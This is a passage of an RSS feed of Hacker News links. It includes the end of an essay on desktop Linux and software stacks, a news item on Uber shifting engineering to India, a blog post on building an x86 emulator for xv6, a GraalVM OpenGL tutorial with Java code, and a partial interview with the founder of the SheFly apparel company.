<p>Meanwhile, when a technology platform is created by a business, it enables a two-sided business model. The (technology) platform vendor sells their APIs to developers as a way of making applications. They sell their technology to consumers with the fringe benefit that these third-party applications are available to augment the experience. The part of the business that is truly a platform model is the App Store, but those came late as an effort to capture a share of the (existing) developer-consumer sales revenue, and don’t really make the vendors platform businesses.</p>





<p>In fact, I’m going to drop the word platform now, as it has these two different meanings. I’ll say “store” or “App Store” when I’m talking about a platform business in software, and “stack” or “software stack” when I’m talking about a platform technology model.</p>





<p>Stack vendors have previously been very protective of their stack, trying to fend off alternative technologies that allow consumers to take their business elsewhere. Microsoft famously “poisoned” Java, an early and capable cross-platform application API, by bundling their own runtime that made Java applications deliberately run poorly. Apple famously added a clause to their store rules that forbade any applications made using off-stack technology.</p>





<p>Both of these situations are now in the past: Microsoft have even embraced some cross-platform technology options, making heavy use of Electron in their own applications and even integrating the Chromium rendering engine into their own browser to increase compatibility with cross-platform technology and reduce the cost of supporting those websites and applications made with Javascript. Apple have abandoned that “only” clause in their rules, replacing it with a collection of “but also” rules: yes you can make your applications out of whatever you want, but they have to support sign-in and payment mechanisms unique to their stack. So a cross-stack app is <em>de jure</em> better integrated in Apple’s sandpit.</p>





<p>These actions show us how these stack vendors expect people to switch stacks: they find a compelling application, they use it, they discover that this application works better or is better integrated on another stack, and so they change to it. If you’re worried about that, then you block those applications so that your customers can’t discover them. If you’re not worried about that, then you allow the technologies, and rely on the fact that applications are commodities and nobody is going to find a “killer app” that makes them switch.</p>





<p>Allowing third-party software on your own platform (cross-stack or otherwise) comes with a risk, that people are only buying your technology as an incidental choice to run something else, and that if it disappears from your stack, those customers might go away to somewhere that it is available. Microsoft have pulled that threat out of their briefcase before, settling a legal suit with Apple after suggesting that they would remove Word and Excel from the Mac stack.</p>





<p>That model of switching explains why companies that are otherwise competitors seem willing to support one another by releasing their own applications on each others’ stacks. When Apple and Microsoft are in competition, we’ve already seen that Microsoft’s applications give them leverage over Apple: they also allow Apple customers to be fringe players in the Microsoft sandpit, which may lead them to switch (for example when they see how much easier it is for their Windows-using colleagues to use all of the Microsoft collaboration tools their employers use). But Apple’s applications also give them leverage over Microsoft: the famed “halo effect” of Mac sales being driven by the iPod fits this model: you buy an iPod because it’s cool, and you use iTunes for Windows. Then you see how much better iTunes for Mac works, and your next computer is a Mac. The application is a gateway to the stack.</p>





<p>What has all of this got to do with desktop Linux? Absolutely nothing, and that’s my point. There’s never been a “halo effect” for the Free Software world because there’s never been a nucleus around which that halo can form. The <a href="http://catb.org/~esr/writings/cathedral-bazaar/cathedral-bazaar/">bazaar model</a> does a lot to ensure that. Let’s take a specific example: for many people, Thunderbird is the best email client you can possibly get. It also exists on multiple stacks, so it has the potential to be a “gateway” to desktop Linux.</p>





<p>But it won’t be. The particular bazaar hawkers working on Thunderbird don’t have any particular commitment to the rest of the desktop Linux stack: they’re not necessarily against it, but they’re not necessarily for it either. If there’s an opportunity to make Thunderbird better on Windows, anybody can contribute to exploit that opportunity. At best, Thunderbird on desktop Linux will be as good as Thunderbird anywhere else. Similarly, the people in the Nautilus file manager area of the bazaar have no particular commitment to tighter integration with Thunderbird, because their users might be using GNUMail or Evolution.</p>





<p>At one extreme, the licences of software in the bazaar dissuade switching, too. Let’s say that CUPS, the common UNIX printing subsystem, is the best way to do printing on any platform. Does that mean that, say, Mac users with paper-centric workflows or lifestyles will be motivated to switch to desktop Linux, to get access to CUPS? No, it means Apple will take advantage of the CUPS licence to integrate it into their stack, giving them access to the technology.</p>





<p>The only thing the three big stack vendors seem to agree on when it comes to free software licensing is that the GPL version 3 family of licences is incompatible with their risk appetites, particularly their weaponised patent portfolios. So that points to a way to avoid the second of these problems blocking a desktop Linux “halo effect”. Were there a GPL3 killer app, the stack vendors probably wouldn’t pick it up and integrate it. Of course, with no software patent protection, they’d be able to reimplement it without problem.</p>





<p>But even with that dissuasion, we still find that the app likely wouldn’t be a better experience on a desktop Linux stack than on Mac, or on Windows. There would be no halo, and there would be no switchers. Well, not no switchers, but probably no more switchers.</p>





<p>Am I minimising the efforts of consistency and integration made by the big free software desktop projects, KDE and GNOME? I don’t think so. I’ve used both over the years, and I’ve used other desktop environments for UNIX-like systems (please may we all remember CDE so that we never repeat it). They are good, they are tightly integrated, and thanks to the collaboration on specifications in the Free Desktop Project they’re also largely interoperable. What they aren’t is breakout. Where Thunderbird is a nucleus without a halo, Evolution is a halo without a nucleus: it works well with the other GNOME tools, but it isn’t a lighthouse attracting users from, say, Windows, to ditch the rest of their stack for GNOME on Linux.</p>





<p>Desktop Linux is a really good desktop stack. So is, say, the Mac. You could get on well with either, but unless you’ve got a particular interest in free software, or a particular frustration with Apple, there’s no reason to switch. Many people do not have that interest or frustration.</p>





				</div></div>]]>
            </description>
            <link>https://www.sicpers.info/2020/07/another-non-year-of-desktop-linux/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731963</guid>
            <pubDate>Sat, 04 Jul 2020 13:05:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Uber wants to cut costs by shifting its engineering to India]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 103 (<a href="https://news.ycombinator.com/item?id=23731891">thread link</a>) | @SQL2219
<br/>
July 4, 2020 | https://www.businessinsider.in/business/news/uber-is-struggling-due-to-covid19-now-it-wants-to-cut-costs-by-shifting-its-engineering-to-india/articleshow/76768028.cms | <a href="https://web.archive.org/web/*/https://www.businessinsider.in/business/news/uber-is-struggling-due-to-covid19-now-it-wants-to-cut-costs-by-shifting-its-engineering-to-india/articleshow/76768028.cms">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div id="datatxt76768028read"><div data-den="denmark"><div><ul>
 <li><keyword keytype="person" smid="0" usetype="2" keywordseo="Uber-CEO" actualkeyword="Uber CEO">Uber CEO</keyword> Dara Khosrowshahi is eager to shift engineering innovation to India as it will be cheaper for the company, said a report by The Information.</li>
 <li>Globally, Uber lost $2.9 billion in the first three months of the year because of the coronavirus pandemic. </li>
 <li>Khosrowshahi had earlier said that the impact of COVID-19 would be drastic for the company. </li>
</ul><p>Ride hailing giant Uber has been severely impacted by the coronavirus pandemic across the world. Globally, Uber lost 
<a target="_blank" href="https://www.cbsnews.com/news/uber-earnings-q1-161-million-loss-ridership-falls-3-percent/" rel="nofollow">$2.9 billion</a> in the first three months of the year because of the coronavirus pandemic. 
</p><p>
And now, in a step to cut costs by shifting its engineering jobs to India, said a report by 
<a target="_blank" href="https://www.theinformation.com/articles/uber-ceo-wants-to-shift-more-engineering-jobs-to-india-sparking-internal-debate?shared=53eda2af81f50ffb" rel="nofollow">The Information.</a> According to the report, Uber CEO Dara Khosrowshahi is eager to shift engineering innovation to India as it will be cheaper for the company.
</p><keyword keytype="person" smid="0" usetype="2" keywordseo="Uber-India" actualkeyword="Uber India">Uber India</keyword><p> didn’t comment on the same. 
</p><p>
<span>Advertisement</span></p><hr><p>Khosrowshahi had earlier said that the impact of COVID-19 would be drastic for the company. 
</p><p>
    "I won't sugarcoat it. COVID-19 has had a dramatic impact on rides, with the business down globally around 80% in April,” he 
<a target="_blank" href="https://www.cbsnews.com/news/uber-earnings-q1-161-million-loss-ridership-falls-3-percent/" rel="nofollow">said</a> during the conference call for its earnings. 
</p><p>
Earlier, as a part of its massive global layoff of 6,700 employees, Uber India had laid off 600 employees in India. “The impact of Covid-19 and the unpredictable nature of the recovery has left Uber IndiaSA with no choice but to reduce the size of its workforce. Around 600 full time positions across driver and rider support, as well as other functions, are being impacted. These reductions are part of previously announced global job cuts this month,” Pradeep Parameswaran, President, Uber India and South Asia had said during the layoffs in May 2020. 
</p><p><span>Advertisement</span></p><hr><p>However, Uber’s wish to shift its engineering to India is not something new. During his visit to India in 2019, Khosrowshahi had said that India is going to be a big source of innovation for them. “One example is the Uber Lite app, was designed and built in India and moved to over 30 countries around the world,” he had said.
</p><p>
Manik Gupta who was then the Chief Product Officer of Uber had said that Uber is proud of the engineering and product talent based out of Bengaluru and Hyderabad. “We have a goal to double the headcount in these offices and have 1,000 people to build innovative products out of India,” he had said.
</p><p>
    SEE ALSO:
<br>
<a href="https://www.businessinsider.in/business/telecom/news/vodafone-idea-news-how-much-cash-does-vodafone-idea-need-to-survive/articleshow/76766763.cms">Only cash can save Vodafone Idea from a slow death⁠— and it needs a lot of it</a>
<br data-name="47" data-nm1="br"><span>Advertisement</span></p><hr>

<p><a href="https://www.businessinsider.in/business/news/reliance-jio-gets-investment-from-intel-capital/articleshow/76761995.cms">Reliance Jio gets ₹1894.5 crore from Intel Capital – the 12th investment in 11 weeks</a></p></div></div></div></div></div>]]>
            </description>
            <link>https://www.businessinsider.in/business/news/uber-is-struggling-due-to-covid19-now-it-wants-to-cut-costs-by-shifting-its-engineering-to-india/articleshow/76768028.cms</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731891</guid>
            <pubDate>Sat, 04 Jul 2020 12:48:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I wrote an x86 emulator that runs a small OS, xv6]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731881">thread link</a>) | @yo_ohei
<br/>
July 4, 2020 | https://yohei.codes/post/dax86/ | <a href="https://web.archive.org/web/*/https://yohei.codes/post/dax86/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      <div>
        <div id="content">
          <article>
    
    

    
    <div>
      <p>I wrote an x86 simulator that runs a small OS, xv6 for study purpose without translating binaries or memory. Everything is implemented C codes.</p>
<p>Repository Link: <a href="https://github.com/ykskb/dax86">https://github.com/ykskb/dax86</a></p>
<p>Here’s some key points about it (excerpt from README):</p>
<blockquote>
<p>Why:</p>
<ul>
<li>I wanted to learn how an OS runs on CPUs at architecture / instruction level.</li>
</ul>
<p>What:</p>
<ul>
<li>Runs vanilla xv6 (memfs) image from boot.</li>
<li>Each instruction is manually implemented and executed sequentially without binary translation, pipeline or OoOE.</li>
<li>Representation of logic is prioritized over the performance. Codes have bunch of comments covering the instructions and the hardware mechanism as well.</li>
</ul>
</blockquote>
<p>In this article, I’d like to share some of the processes I went through to learn about the CPU architecture and develop this emulator as well as the difficulties I was faced with.</p>
<blockquote>
<p>I’m writing about some of my key learnings in separate articles:</p>
<ul>
<li><a href="https://yohei.codes/post/xv6-bootblock/">xv6 image: Boot Sector</a></li>
<li><a href="https://yohei.codes/post/xv6-memory-1/">xv6: Memory Addressing Part 1</a></li>
<li>xv6: Memory Addressing Part 2 (coming soon)</li>
<li>xv6: Device Emulation (coming soon)</li>
</ul>
</blockquote>
<h3 id="start">Start</h3>
<p>Firstly I started this project with <a href="https://book.mynavi.jp/ec/products/detail/id=41347">this Japanese book</a>. Whether you find the anime girl on cover cute or distracting, it’s a great book to get anyone started with CPU emulator development. It covers some of the core x86 instructions like <code>mov</code>, <code>add</code>, <code>push</code> and <code>call</code> as well as the basics of ModRM. Some of the structure for instruction definition and execution in dax86 comes from this book.</p>
<p>So I got a CPU emulator somewhat shaped and it could run some testing binaries. However it was nowhere near to run an OS at this point. The emulator didn’t have any device, segment registers or control registers and it only supported 32-bit binary which is only applicable after switching to the protected mode in the real world of x86. There were so many instructions to be implemented as well.</p>
<h3 id="booting">Booting</h3>
<p>Having set up the goal of running xv6, I started to implement all the single-byte instructions while doing research on x86 architecture and xv6 internals concurrently. On the x86 architecture, I found about things like A20 line, segmentation, global descriptor table and paging. On the xv6 side, reading the boot block indicated I would need those different modes of memory addressing working as well as some devices like keyboard and disk.</p>
<p>At this point, as I was mostly working on the booting part, I could still write small chunk of assembly or c codes to exercise somewhat TDD approach. I set the expected behaviors with the test cases and tried to pass them. (You can see them in <code>tests</code> directory.) One thing about this is that those expected behaviors were entirely from my understanding of each component. I kept feeling uncertain there and often ended up being wrong. For example, I had misunderstood the base address calculation on GDT (which bits go where), so my tests were passing, however later on it came back as a hard bug when I was working on TSS (task state segment).</p>
<p>In the booting part, I found these 2 parts as the key learnings: kernel code loading from disk to memory and the page directory switching in page size extension. (Specifically the identical mapping to the first virtual mapping.) I’ve covered these in details in separate articles, but I must say figuring out the linker configuration and image creation on xv6 wasn’t that easy for me.</p>
<h3 id="os-initialization">OS Initialization</h3>
<p>Once I made booting work, I reached the main function of xv6. This is where xv6 configures more devices and chips as well as the memory page initialization, eventually starting the OS’ scheduler loop in the user mode. First challenge for me here was MP (multi-processor) configuration. It involves MP configuration table, IOAPIC and LAPIC for multi-processor systems, where hardware interrupts need to be routed as configured among multiple processors. There are documentations available online, but it’s often challenging when you actually try to emulate them because in many cases those docs only touch the concept and never give you the whole data flow in details. Generally I ended up landing on the CS course materials in university websites. It was obvious this kind of challenges were not developers’ daily problems and I almost never found the solution on Stackoverflow. After learning about them, I ended up using threads with locks for device emulation to send and receive IO data asynchronously and separately from the main thread.</p>
<p>The second half of the main function got me stuck for some time. It was the TSS (task state segment) as mentioned above and also ISR (interrupt service routine), both of which are about switching the context of instruction execution. At this point, having a number of init processes run before hitting the issue, I couldn’t create the test case really to exercise TDD approach. Instead I did quite dirty debugging by targeting specific instruction pointer (EIP) and printing out some key info on the emulator. Literally I printed out some memory region of certain range and debugged the issues. It sometimes felt like locating some broken bridge out of world map. Only thing I could do was scoping the search area gradually with some instinct and creativity as a clueless investigator.</p>
<h3 id="first-shell-command">First Shell Command</h3>
<p>Last one of the challenges was actually a bit funny. It was keyboard mapping after I confirmed the shell running in the user mode. Of course xv6 is a real OS to run on hardware, so it handles the scan code instead of ASCII characters. Not wanting to fiddle with the TTY setting of a running environment too much, I made a map from ASCII back to scan code. Once I finished it, I confirmed I could run <code>ls</code>. It was quite slow but I think I can say it was the best <code>ls</code> command I’ve ever run.</p>
<p><img src="https://yohei.codes/image/dax86-xv6.png" alt="dax86-xv6"></p>
<h3 id="p-s">P. S.</h3>
<p>At the point of writing this article, commands like <code>ls</code>, <code>mkdir</code> and <code>echo</code> run fine. However it doesn’t seem to be so stable yet. There seem to be some spots possibly wrong with the user modes’ page mapping or context switching, resulting in “remap” error from the OS. Segmentation error was occasionally observed at certain EIP address in the user mode as well. These indicate there is still a bit more for me to investigate on the implementation and there are multiple parts in xv6 that I haven’t fully understood yet. Hopefully I can achieve them and share more key findings in this blog. Thanks for reading :)</p>

    </div>

    

  </article>
        </div>
        
    
    

  

  

      </div>
    </div></div>]]>
            </description>
            <link>https://yohei.codes/post/dax86/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731881</guid>
            <pubDate>Sat, 04 Jul 2020 12:45:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[OpenGL Demo Using GraalVM]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731804">thread link</a>) | @vips7L
<br/>
July 4, 2020 | https://www.praj.in/posts/2020/opengl-demo-using-graalvm/ | <a href="https://web.archive.org/web/*/https://www.praj.in/posts/2020/opengl-demo-using-graalvm/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>Let me show how you can use <a href="https://www.graalvm.org/">GraalVM</a> to create an OpenGL app in Java. This is made possible by the <em>native-image</em> tool that helps GraalVM produce truly native binaries capable of interacting with native libraries directly, without any JNI overhead. ⚡️</p><!--more--><h2 id="introduction">Introduction</h2><p>GraalVM has been trending a lot in the Java ecosystem recently. It has a remarkable capability of compiling Java bytecode to native binaries ahead-of-time, an issue that many projects had tried to solve in the past. But that isn't the only fascinating thing. GraalVM supports a multitude of languages like Python, Ruby, JavaScript, C++, Rust, etc. besides the regular JVM languages (like Clojure, Kotlin, and Scala), and lets them interoperate with almost zero overhead. It can also run in multiple contexts including OpenJDK, Node.js, and SubstrateVM (internally used by native-image), making it a powerful polyglot runtime.</p><p>We'll be reproducing the <a href="https://rosettacode.org/wiki/OpenGL/Utah_Teapot">Utah teapot example</a> from Rosetta code in Java 11. Since we'd also be briefly leaving the JVM world to connect with native technologies, some parts would look familiar to C/C++ code. I'm not an OpenGL expert but I'll try my best to explain all the setup. All the source code can be found <a href="https://github.com/praj-foss/opengl-graal-examples">on GitHub</a>.</p><h2 id="project-structure">Project structure</h2><p>Atleast JDK 11 is required to run this project. The <a href="https://plugins.gradle.org/plugin/com.palantir.graal">gradle-graal</a> plugin is used to auto-download GraalVM. It is then configured accordingly:</p><pre><code>graal {
    graalVersion("20.0.0")
    javaVersion("11")

    mainClass("in.praj.glexamples.Main")
    outputName("glExample")
    option("--no-fallback")
    option("--verbose")
    option("--no-server")
    option("-H:+ReportExceptionStackTraces")
}
</code></pre><p>We explicitly mention <code>--no-fallback</code> to prevent GraalVM from using a regular JVM when AOT compilation fails. We also need to specify dependencies on GraalVM and SubstrateVM APIs:</p><pre><code>dependencies {
    val graalVer = graal.graalVersion.get()

    compileOnly("org.graalvm.sdk", "graal-sdk", graalVer)
    compileOnly("org.graalvm.nativeimage", "svm", graalVer)
}
</code></pre><p>Like regular Gradle projects, the sources are present inside <em>src/main/java/</em>. The <code>GLUT</code> and <code>GL</code> classes provide access to functions from <em>libglut</em> and <em>libGL</em>, respectively. The <code>Main</code> class represents our actual OpenGL program. Now let's take a deep dive.</p><h2 id="app-context">App Context</h2><p>First, we specify the required native libraries in a <code>Directives</code> inner class and use it to setup a context for our application. This notifies SubstrateVM of our requirements:</p><pre><code>@CContext(Main.Directives.class)
public class Main {
    public static final class Directives implements CContext.Directives {
        @Override
        public List&lt;String&gt; getHeaderFiles() {
            return Collections.singletonList("&lt;GL/glut.h&gt;");
        }

        @Override
        public List&lt;String&gt; getLibraries() {
            return Arrays.asList("GL", "glut");
        }
    }

    // ...
}
</code></pre><p>Essentially, <code>getHeaderFiles</code> returns the list of all headers we'd have mentioned after <code>#include</code> if it were written in C/C++, and <code>getLibraries</code> returns the list of libraries that would have been passed to your C/C++ compiler.</p><h2 id="bindings">Bindings</h2><p>There's a rich set of API to provide support for raw C/C++ data structures. Most important interface to note is <code>org.graalvm.word.WordBase</code>. It's the base type used to represent native data types like pointers and structs, and its descendants are <strong>not</strong> regular Java objects (descendants of <code>java.lang.Object</code>). Let's take a quick look at parts of <code>&lt;GL/glut.h&gt;</code>, in an over-simplified manner:</p><pre><code>#define  GLUT_SINGLE  0x0000
void  glutInit( int* pargc, char** argv );
void  glutInitDisplayMode( unsigned int displayMode );
void  glutDisplayFunc( void (* callback)( void ) );
</code></pre><p>And here's what the corresponding Java bindings look like:</p><pre><code>@CContext(Main.Directives.class)
class GLUT {
    @CConstant("GLUT_SINGLE")
    static native int SINGLE();

    @CFunction("glutInit")
    static native void init(CIntPointer argc, CCharPointerPointer argv);

    @CFunction("glutInitDisplayMode")
    static native void initDisplayMode(int displayMode);

    @CFunction("glutDisplayFunc")
    static native void displayFunc(Callback callback);

    interface Callback extends CFunctionPointer {
        @InvokeCFunctionPointer void invoke();
    }

    // ...
}
</code></pre><p>There's a boilerplate indeed, but it's much cleaner than JNI. By default, the annotations take the function name as an argument and find the corresponding declaration from the headers. So you have to pass in the names explicitly if you want to use something different for your bindings. Primitive Java types can be used to represent similar C/C++ types, but you'll need to use GraalVM's custom types for handling pointers.The <code>Callback</code> interface is used to represent the signature of a function that needs to be passed into <code>GLUT.displayFunc</code> using a function pointer. After a while, you'll see how we create and pass those function pointers.</p><h2 id="real-program">Real Program</h2><p>Inside our main method we have the actual app code. First, we need to pass in the CLI arguments to our <code>GLUT.init</code> call, and then configure the window system:</p><pre><code>try (var argv = CTypeConversion.toCStrings(args)) {
    var argc = StackValue.get(CIntPointer.class);
    argc.write(args.length);
    GLUT.init(argc, argv.get());
}

GLUT.initDisplayMode(GLUT.SINGLE() | GLUT.RGB() | GLUT.DEPTH());
GLUT.initWindowPosition(15, 15);
GLUT.initWindowSize(400, 400);
try (var title = CTypeConversion.toCString("Utah Teapot - GraalVM")) {
    GLUT.createWindow(title.get());
}
</code></pre><p>The first parameter to <code>GLUT.init</code> is a pointer to the number of CLI arguments, and we create this on our stack using <code>StackValue</code> class. The second parameter is the actual list of CLI arguments, which is represented by an array of Strings in Java and by an array of <code>char*</code> in C/C++. Fortunately, there's a utility class called <code>CTypeConversion</code> for such scenarios. <code>CTypeConversion.toCStrings</code> returns a safe holder for the <code>char**</code> value representing the array, which can be used inside a try-with-resources block. Once the holder is closed, the pointer inside must not be used. We similarly set up <code>GLUT.createWindow</code>.</p><p>Next, we set up the lighting and materials that affect our scene:</p><pre><code>GL.clearColor(0.5f, 0.5f, 0.5f, 0f);
GL.shadeModel(GL.SMOOTH());
try (var white = PinnedObject.create(new float[] {1f, 1f, 1f, 0f});
     var shine = PinnedObject.create(new float[] {70f})) {
    GL.lightfv(GL.LIGHT0(), GL.AMBIENT(), white.addressOfArrayElement(0));
    GL.lightfv(GL.LIGHT0(), GL.DIFFUSE(), white.addressOfArrayElement(0));
    GL.materialfv(GL.FRONT(), GL.SHININESS(), shine.addressOfArrayElement(0));
}

GL.enable(GL.LIGHTING());
GL.enable(GL.LIGHT0());
GL.enable(GL.DEPTH_TEST());
</code></pre><p>The third parameter to <code>GL.lightfv</code> and <code>GL.materialfv</code> requires a float array. Now, Java arrays cannot be directly passed here because they don't descend from <code>WordBase</code>. So we create a <code>PinnedObject</code> to represent this array and pass the pointer to its first element using <code>addressOfArrayElement(0)</code>. Pinning the array is important as it preserves the value of that pointer by preventing the garbage collector from moving it. After the pinned object is closed, the garbage collector is free to remove it.</p><p>We end our main method by setting up display and idle callbacks, and running the GLUT main loop:</p><pre><code>GLUT.displayFunc(displayCallback.getFunctionPointer());
GLUT.idleFunc(idleCallback.getFunctionPointer());
GLUT.mainLoop();
</code></pre><p>The <code>display</code> function is used to draw the teapot, while the <code>idle</code> function updates its angle of rotation. Both are called each frame by the GLUT main loop. Right now, creating pointer to a function with specific signature is a bit tricky. This will likely become much simpler when <a href="https://github.com/oracle/graal/issues/730">issue 730</a> is resolved. Let's take a look at how the display callback is implemented here:</p><pre><code>@CEntryPoint
@CEntryPointOptions(prologue = CEntryPointSetup.EnterCreateIsolatePrologue.class,
                    epilogue = CEntryPointSetup.LeaveTearDownIsolateEpilogue.class)
private static void display() {
    GL.clear(GL.COLOR_BUFFER_BIT() | GL.DEPTH_BUFFER_BIT());

    GL.pushMatrix();
    GL.rotatef(rotation.get().read(), 0f, 1f, 1f);
    try (var mat = PinnedObject.create(new float[] {1, 0, 0, 0})) {
        GL.materialfv(GL.FRONT(), GL.DIFFUSE(), mat.addressOfArrayElement(0));
    }
    GLUT.wireTeapot(0.5);
    GL.popMatrix();

    GL.flush();
}

private static final CEntryPointLiteral&lt;GLUT.Callback&gt; displayCallback =
        CEntryPointLiteral.create(Main.class, "display");
</code></pre><p>The <code>display</code> function is annotated as a <code>@CEntryPoint</code> to allow calling it from the native side. The <code>@CEntryPointOptions</code> is used to configure the handling of <em>Isolates</em>. These are disjoint heaps that can be used to strictly separate groups of objects in memory. I won't go deeper into the topic, but you can see <a href="https://link.medium.com/0eOUY2HGI7">Christian Wimmer's post</a> for an idea. Each time such an entry-point is called, we need to take care of the isolate it will be executed in. We simply create an isolate upon entering the function and destroy it upon returning. Finally, we create a <code>CEntryPointLiteral</code> to hold the pointer to <code>display</code> and cast it as a <code>GLUT.Callback</code>.</p><p>Now we need to implement the <code>idle</code> function to update the angle of rotation. This angle is stored as an global variable whose pointer is accessible to both <code>display</code> and <code>idle</code> functions.</p><pre><code>private static final CGlobalData&lt;CFloatPointer&gt; rotation = 
    CGlobalDataFactory.createBytes(() -&gt; 4);

@CEntryPoint
@CEntryPointOptions(prologue = CEntryPointSetup.EnterCreateIsolatePrologue.class,
                    epilogue = CEntryPointSetup.LeaveTearDownIsolateEpilogue.class)
private static void idle() {
    var rotPtr = rotation.get();
    rotPtr.write(0.1f + rotPtr.read());
    GLUT.postRedisplay();
}

private static final CEntryPointLiteral&lt;GLUT.Callback&gt; idleCallback =
        CEntryPointLiteral.create(Main.class, "idle");
</code></pre><p>Any <code>static final</code> value is stored in a special location called the <em>Image Heap</em> and this is accessible to any isolate. We allocate 4 bytes (size of <code>float</code>) and create a pointer to this in our image heap using <code>CGlobalDataFactory</code>. This global variable can be accessed inside <code>idle</code> function to update the …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.praj.in/posts/2020/opengl-demo-using-graalvm/">https://www.praj.in/posts/2020/opengl-demo-using-graalvm/</a></em></p>]]>
            </description>
            <link>https://www.praj.in/posts/2020/opengl-demo-using-graalvm/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23731804</guid>
            <pubDate>Sat, 04 Jul 2020 12:27:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Charlotte Massey on founding SheFly – Women's pants with a patent-pending zipper]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23731761">thread link</a>) | @SuDa2103
<br/>
July 4, 2020 | https://www.journeyoftheidea.com/posts/shefly | <a href="https://web.archive.org/web/*/https://www.journeyoftheidea.com/posts/shefly">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><strong>Could you give us a quick introduction to SheFly?&nbsp;</strong></p><p>SheFly is a women’s outdoor apparel company. We specialise in women’s pants, with a patent-pending zipper, so that everyone can relieve themselves outside without removing their clothing. The goal is to make women feel comfortable and confident outside and also, help with safety issues if you have to remove harnesses and other safety equipment when you go to the bathroom outside.</p><p>We are still relatively new – we’re about two and a half years old. We launched via a crowdfunding campaign last spring on IFundWomen, where we raised $55,000, which was triple our goal. That allowed us to get into manufacturing. We’ve also got some investment from the Dorm Room Fund and First Round Capital. &nbsp;</p><p><strong>What was your career journey prior to starting SheFly?&nbsp;</strong></p><p>I started SheFly with two co-founders while I was still in college. Before that, I had worked on a number of social impact projects and organisations. I was always very entrepreneurial. I started my own art business where I sold paintings and prints. I did that as my summer job in college. I actually did a research fellowship concurrent with SheFly. My fellowship was called The Watson Fellowship, and I was supposed to spend 12 months (it ended up being less because of COVID) researching women’s working conditions in rural mountain communities around the world. Specifically focussing on women who work as mountaineering, rock climbing and trekking guides. I did research in India, Nepal, Thailand, Chile and Argentina, before I had to return because of COVID.&nbsp;</p><p><strong>&nbsp;How did you come across the idea?</strong></p><p>My co-founder Georgia Grace came up with the idea because she was working as a glacier guide in Alaska. Most of the other guides were men and they could just turn around and go to the bathroom. Whereas she would have to trek away across glaciers and pull all of her clothing off in order to relieve herself. She thought that there must be a better way to do that. Her and my other co-founder Bianca worked together for a summer in Salt Lake City. They went on a lot of hikes and discussed it further over many uncomfortable pee-breaks where they had to completely disrobe. They decided there could actually be some market potential.</p><p>&nbsp;They came back to school, and time went on, and then Georgia Grace decided to take a class on entrepreneurship at our university. I’d heard she was doing it, and thought that the idea was great. I’m a rock climber and a mountaineer and I’ve spent a lot of time on rope teams, with, usually all men. You’re up on a glacier and the guys all just unzip their flies and go to the bathroom and I would not be able to use the bathroom for the entire time we were on the glacier, unless I wanted to take my harness off. That’s a really big safety risk because you can fall at any moment, and that’s why you have to rope up in the first place. I actually ended up joining the team because I was studying in Mauritius, and I had to have emergency surgery, and got stuck there on the island, which led to me needing to take a semester off from school. So then Bianca said “we’re starting this for real now, and we need help” and I had time, so that’s how I joined.&nbsp;</p><p><strong>How did you meet your cofounders?</strong></p><p>We all went to college together. We went to a pretty small liberal arts school in Vermont, called Middlebury. Everyone kind of knows each other generally, but I met Bianca because we lived in the same house and she became good friends with Georgia Grace because of their summer working together. I didn’t know Georgia Grace all that well before we started working together.&nbsp;</p><p><strong>Were there any other ideas that you were considering when you were starting out?</strong></p><p>The goal was to solve the problem. We definitely started the company because we wanted a product that makes it easier for women to go to the bathroom outside. We worked on a lot of different designs for how that product would function. We first looked to what exists in the market already, which are funnels called female urination devices, that you can line up under your pants. But they have leakage issues and we also didn’t like the idea of having to adapt women’s anatomy to fit men’s clothing. Instead, we wanted to address clothing to fit our anatomy and our bodies. There are skirts which are specifically designed for hiking, but you can’t wear harnesses with those and you also can’t use them in the snow.&nbsp;</p><p>The original problem that Georgia Grace wanted to tackle was the issue of being cold, because that was her experience in the glaciers. So we started out with snow pants. The first prototypes are bright blue with a neon yellow zipper sewn into the crotch. Bianca actually graduated from college wearing that prototype, because we have a graduation ceremony where you ski down a hill in order to graduate. That’s how we started. We decided that that was not the product to go to market with, partly because it’s a seasonal industry, to make snow pants. And also because most people will only buy one or two, it’s much more expensive, way more difficult to manufacture and it didn’t make sense because when people are skiing in resorts there are usually bathrooms available.&nbsp;</p><p>That’s when we decided to make normal hiking pants. We wanted it to be nice-enough looking that you could wear it on the street, or wear it to work. We didn’t just want to solve the problem of having to go to the bathroom, we wanted to solve other problems involved with women’s pants. One of those problems is pocket size. Our pockets are on average 2/3 the size of men’s pockets, so we wanted to make sure we had pockets big enough to hold things. It’s absurd that women often can’t fit a wallet or a phone into pockets that are clearly intended to carry those items. We also wanted to use a fabric that was tough enough to not rip when you’re sliding over rocks or doing things like that.</p><p><strong>How did your previous experience prepare you for your current venture? In what ways were you unprepared?</strong></p><p>We all went to liberal arts school. We learned how to think, how to learn and how to teach ourselves, which I think is the best skill that you get out of that type of education. I majored in Philosophy, Bianca studied GIS, Georgia Grace studied Economics and Politics. None of us had a background in manufacturing, and that was definitely our biggest gap coming into it. After working with lawyers and seamstresses around Vermont, we’d come up with the design that we wanted to patent but we didn’t know how to turn that into something that would be available for people to purchase. We were able to overcome that through a lot of research, partly through trial and error, and by hiring a designer based in New York who could help us prototype and figure out how the size gradings should work and all of that. We worked with a factory that was very helpful when it came to prototyping and helping us figure out exactly what we wanted.&nbsp;</p><p><strong>After you had the idea what were the next steps? &nbsp;</strong></p><p>The IP aspect was a big challenge for us. We were very unclear about whether 